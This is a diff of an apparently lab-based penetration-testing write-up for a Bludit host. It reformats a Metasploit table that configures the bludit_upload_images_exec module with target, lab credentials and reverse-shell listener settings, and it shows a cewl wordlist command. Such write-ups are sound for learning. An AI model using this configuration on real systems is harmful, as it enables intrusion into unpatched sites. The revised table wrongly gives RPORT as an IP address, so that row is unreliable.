@@ -9,7 +9,7 @@ titlepage: true
 titlepage-color: "1E90FF"
 titlepage-text-color: "FFFAFA"
 titlepage-rule-color: "FFFAFA"
-titlepage-rule-height: 50
+titlepage-rule-height: 2
 book: true
 classoption: oneside
 code-block-font-size: \scriptsize
@@ -253,15 +253,16 @@ command: cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/
 
   By searching Bludit on metasploit, we found a module
   <br />
-  Variables to set  |         Varibables setted 
-  ------------------|----------------------------------------
-   Name of module   |  exploit/linux/http/bludit_upload_images_exec
-      RHOST         |           10.10.10.191 
-      RPORT         |                80
-    BLUDITUSER      |              fergus 
-    BLUDITPASS      |         RolandDeschain
-      LHOST         |               tun0 
-      LPORT         |               4444 
+|    Variables   |                Values assigned               |
+|:--------------:|:--------------------------------------------:|
+| Name of module | exploit/linux/http/bludit_upload_images_exec |
+|      RHOST     |                 10.10.10.191                 |
+|      RPORT     |                 10.10.10.191                 |
+|   BLUDITUSER   |                    fergus                    |
+|   BLUDITPASS   |                RolandDeschain                |
+|      LHOST     |                     tun0                     |
+|      LPORT     |                     4444                     |
+|    TARGETURI   |                       /                      |
 <br />	       
 
 #### checking the user id
